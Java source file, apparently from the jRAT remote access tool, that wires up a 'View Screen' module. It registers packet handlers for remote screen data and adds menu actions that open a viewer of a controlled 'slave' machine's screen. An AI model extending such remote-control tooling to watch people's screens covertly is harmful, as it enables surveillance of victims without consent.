package jrat.module.screen;

import jrat.api.*;
import jrat.controller.AbstractSlave;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPackets;
import jrat.module.screen.packets.PacketRemoteScreenChunk;
import jrat.module.screen.packets.PacketRemoteScreenCompleted;
import jrat.module.screen.packets.PacketReceiveAllThumbnails;
import jrat.module.screen.ui.FrameRemoteScreen;

public class ScreenModule extends Module {

    public void init() throws Exception {
        IncomingPackets.register((short) 68, PacketRemoteScreenCompleted.class);
        IncomingPackets.register((short) 71, PacketReceiveAllThumbnails.class);
        IncomingPackets.register((short) 26, PacketRemoteScreenChunk.class);

        ClientMenuItem item = new ClientMenuItem("View Screen", Resources.getIcon("screen"), new ClientMenuListener() {
            @Override
            public void onClick(AbstractSlave slave) {
                FrameRemoteScreen.show((Slave) slave);
            }
        });

        ClientMenu.addItem(ClientMenu.Category.QUICK_OPEN, item);

        ControlPanelAction action = new ControlPanelAction(ControlPanel.Category.SYSTEM, "View Screen", Resources.getIcon("screen"));
        action.setAction(new ControlPanelListener() {
            public void onClick(AbstractSlave slave) {
                FrameRemoteScreen.show((Slave) slave);
            }
        });

        ControlPanel.items.add(action);
    }
}
